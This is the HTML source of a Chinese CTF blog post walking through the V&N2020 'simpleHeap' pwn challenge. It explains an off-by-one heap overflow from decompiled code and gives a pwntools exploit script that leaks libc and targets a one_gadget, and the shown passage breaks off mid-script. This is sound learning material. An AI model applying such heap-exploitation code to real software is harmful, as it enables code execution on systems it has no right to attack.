@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>Welcome to the world of Heap | Ld1ng</title>
+  <meta name="description" content="0x00 前言题目地址：[[V&amp;N2020 公开赛]simpleHeap]([https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B\]simpleHeap](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[V&amp;N2020 公开赛]simpleHeap)) 听说是一道比较基础的堆题，于是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Welcome to the world of Heap">
+<meta property="og:url" content="http://ld1ng.com/2020/08/11/simple_heap/index.html">
+<meta property="og:site_name" content="Ld1ng">
+<meta property="og:description" content="0x00 前言题目地址：[[V&amp;N2020 公开赛]simpleHeap]([https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B\]simpleHeap](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[V&amp;N2020 公开赛]simpleHeap)) 听说是一道比较基础的堆题，于是">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/pde4C1IrUcNHW5h.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/IZHW4h25M1RKuT6.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/YbteQypMAOLBsGW.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/1xCIOypGD8ng7kS.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/BFG1x4ytAOndW2i.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/kMOErLsuavFzwpK.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/wuAZ4ltnMLigdkB.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/tluzdIYBOTLnpyM.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/M63ChXJHuwjgZSe.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013175155220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01heG1hbGxvYw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/PEqzWCFpwbIv5G7.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/11/t6GjbmLXWDV5oeQ.png">
+<meta property="article:published_time" content="2020-08-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-08-11T13:20:30.854Z">
+<meta property="article:author" content="Ld1ng">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/08/11/pde4C1IrUcNHW5h.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://ld1ng.com/2020/08/11/simple_heap/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Ld1ng" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/ld1ng" target="_blank">
+          <img class="img-circle img-rotate" src="/images/liding.png" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Ld1ng</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> JiangSu , China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav menu-highlight">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ld1ng" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://weibo.com/5580147545/profile?" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/Liding10763325" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>When people lose their thinking power, the human age will end</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DEVELOP/">DEVELOP</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/LEARNING/">LEARNING</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/LIFE/">LIFE</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/REVERSE/">REVERSE</a><span class="category-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+    <script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+    <script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+    <div class="widget-wrap">
+        <h3 class="widget-title">Tag Cloud</h3>
+        <div id="myCanvasContainer" class="widget tagcloud">
+            <canvas width="200" height="200" id="resCanvas" style="width=100%">
+                <a href="/tags/ADWorld/" style="font-size: 15px;">ADWorld</a> <a href="/tags/Assembly/" style="font-size: 10px;">Assembly</a> <a href="/tags/Bugku/" style="font-size: 10px;">Bugku</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/KNOWLEDGE/" style="font-size: 15px;">KNOWLEDGE</a> <a href="/tags/OpenCV/" style="font-size: 10px;">OpenCV</a> <a href="/tags/PERSONALITY/" style="font-size: 10px;">PERSONALITY</a>
+            </canvas>
+        </div>
+    </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ADWorld/" rel="tag">ADWorld</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Assembly/" rel="tag">Assembly</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bugku/" rel="tag">Bugku</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KNOWLEDGE/" rel="tag">KNOWLEDGE</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OpenCV/" rel="tag">OpenCV</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PERSONALITY/" rel="tag">PERSONALITY</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled ">
+        
+          <li>
+            
+            <div class="item-thumb">
+              <a href="/2020/08/11/simple_heap/" class="thumb">
+    
+    
+        <span class="thumb-image thumb-none"></span>
+    
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/PWN/">PWN</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/08/11/simple_heap/" class="title">Welcome to the world of Heap</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-08-10T16:00:00.000Z" itemprop="datePublished">2020-08-11</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-thumb">
+              <a href="/2020/08/05/WMCTF/" class="thumb">
+    
+    
+        <span class="thumb-image thumb-none"></span>
+    
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/REVERSE/">REVERSE</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/08/05/WMCTF/" class="title">WMCTF2020</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-08-04T16:00:00.000Z" itemprop="datePublished">2020-08-05</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-thumb">
+              <a href="/2020/07/24/ADWorld-pwn/" class="thumb">
+    
+    
+        <span class="thumb-image thumb-none"></span>
+    
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/PWN/">PWN</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/07/24/ADWorld-pwn/" class="title">ADWorld_PWN  (updating..)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-07-23T16:00:00.000Z" itemprop="datePublished">2020-07-24</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-thumb">
+              <a href="/2020/07/23/Heap/" class="thumb">
+    
+    
+        <span class="thumb-image thumb-none"></span>
+    
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/LEARNING/">LEARNING</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/07/23/Heap/" class="title">堆溢出漏洞利用总结</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-07-22T16:00:00.000Z" itemprop="datePublished">2020-07-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-thumb">
+              <a href="/2020/07/01/canary/" class="thumb">
+    
+    
+        <span class="thumb-image thumb-none"></span>
+    
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/LEARNING/">LEARNING</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/07/01/canary/" class="title">学习canary&amp;&amp;栈迁移</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-06-30T16:00:00.000Z" itemprop="datePublished">2020-07-01</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">Catalogue</h3>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-分析程序"><span class="toc-number">2.</span> <span class="toc-text">0x01 分析程序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-exp"><span class="toc-number">3.</span> <span class="toc-text">0x02 exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-小结"><span class="toc-number">4.</span> <span class="toc-text">0x03 小结</span></a></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-simple_heap" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Welcome to the world of Heap
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/08/11/simple_heap/" class="article-date">
+	  <time datetime="2020-08-10T16:00:00.000Z" itemprop="datePublished">2020-08-11</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/PWN/">PWN</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/08/11/simple_heap/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 2k(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 8(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>题目地址：[[V&amp;N2020 公开赛]simpleHeap]([<a href="https://buuoj.cn/challenges#[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B\]simpleHeap]" target="_blank" rel="noopener">https://buuoj.cn/challenges#[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B\]simpleHeap]</a>(<a href="https://buuoj.cn/challenges#[V&amp;N2020" target="_blank" rel="noopener">https://buuoj.cn/challenges#[V&amp;N2020</a> 公开赛]simpleHeap))</p>
+<p>听说是一道比较基础的堆题，于是手贱点开了…这就是堆吗</p>
+<p>wxl，断断续续看了差不多两天，不能说会做了，勉强搞明白了原理，并且手动调试了一遍</p>
+<p>😲权当见见世面吧，这里也通过写博客快速梳理一遍。</p>
+<hr>
+<h1 id="0x01-分析程序"><a href="#0x01-分析程序" class="headerlink" title="0x01 分析程序"></a>0x01 分析程序</h1><p>经典菜单，直接IDA</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  sub_A39();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to V&amp;N challange!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This's a simple heap for you."</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Menu();    <span class="comment">//打印菜单</span></span><br><span class="line">    put_in();  <span class="comment">//输入选项 （atoi）</span></span><br><span class="line">    <span class="keyword">switch</span> ( &amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        Add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        Edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        Show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        Delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Please input current choice."</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数名是我改过的，之前sub_213!@#$%^实在太难读！</p>
+<p>然后分别看看4个操作都干了什么</p>
+<p><code>Add()</code>：根据传入的size malloc内存，heap_pointer是 heap指针，heap_size保存堆块的size</p>
+<p><img src="https://i.loli.net/2020/08/11/pde4C1IrUcNHW5h.png" alt=""></p>
+<p><code>Edit()</code>：通过输入idx，修改内存数据，但是存在一个小漏洞off by one</p>
+<p><img src="https://i.loli.net/2020/08/11/IZHW4h25M1RKuT6.png" alt=""></p>
+<p>进入sub_C39函数如下，仅多溢出一个字节，但是威力巨大，下面慢慢看</p>
+<p><img src="https://i.loli.net/2020/08/11/YbteQypMAOLBsGW.png" alt=""></p>
+<p><code>Show()</code>: 很简单，输出idx的内容，似乎没什么有用的点</p>
+<p><img src="https://i.loli.net/2020/08/11/1xCIOypGD8ng7kS.png" alt=""></p>
+<p><code>Delete()</code>：free，该置0的指针全部置0，嗯很严谨，UAF不能用了</p>
+<p><img src="https://i.loli.net/2020/08/11/BFG1x4ytAOndW2i.png" alt=""></p>
+<hr>
+<h1 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h1><p>这就上exp了？</p>
+<p>先把别的大佬的exp放上来，然后慢慢分析</p>
+<p>exp我改过，题目libc2.23和我本机的2.23还不一样，偏移差了很多，害我调了好长好长时间</p>
+<p>原exp在我本地实在跑不出来，无奈只好改一改</p>
+<p>以下exp以我的libc为准：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">sh=process(<span class="string">"./heap"</span>)</span><br><span class="line">libc=ELF(<span class="string">"真·libc2.23"</span>)</span><br><span class="line"><span class="comment">#sh=remote('node3.buuoj.cn',25310)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	sh.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">	sh.sendline(str(<span class="number">1</span>))</span><br><span class="line">	sh.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">	sh.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	sh.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">	sh.sendline(str(<span class="number">2</span>))</span><br><span class="line">	sh.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line">	sh.recvuntil(<span class="string">"Done!"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sh.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">	sh.sendline(str(<span class="number">3</span>))</span><br><span class="line">	sh.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sh.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">	sh.sendline(str(<span class="number">4</span>))</span><br><span class="line">	sh.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(<span class="string">"Done!"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)	<span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'b'</span>*<span class="number">0x10</span>)	<span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'c'</span>*<span class="number">0x10</span>)	<span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'e'</span>*<span class="number">0x30</span>) <span class="comment">#idx1</span></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>))<span class="comment">#chunk2.size:0x91</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">4</span>) <span class="comment">#idx3</span></span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0</span>))<span class="comment">#idx4</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"A"</span>*<span class="number">0x10</span>)  <span class="comment">#idx5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)	<span class="comment">#idx6</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0x21</span>))	<span class="comment">#idx7</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">0x10</span>)	<span class="comment">#idx8</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'c'</span>*<span class="number">0x10</span>)	<span class="comment">#idx9</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'d'</span>*<span class="number">0x18</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)	<span class="comment">#idx6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)  <span class="comment">#释放到unsorted bin里</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'e'</span>*<span class="number">0x20</span>) <span class="comment">#idx1</span></span><br><span class="line">show(<span class="number">1</span>) <span class="comment">#leak main_arena+88</span></span><br><span class="line"></span><br><span class="line">libc_base=u64(sh.recv(<span class="number">38</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x68</span><span class="number">-0x3c4b10</span><span class="comment">#malloc</span></span><br><span class="line"><span class="comment">#0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span> + hex(libc_base)</span><br><span class="line">one_daget_offset=<span class="number">0x4527a</span></span><br><span class="line">one_daget=libc_base+one_daget_offset</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#fast bin 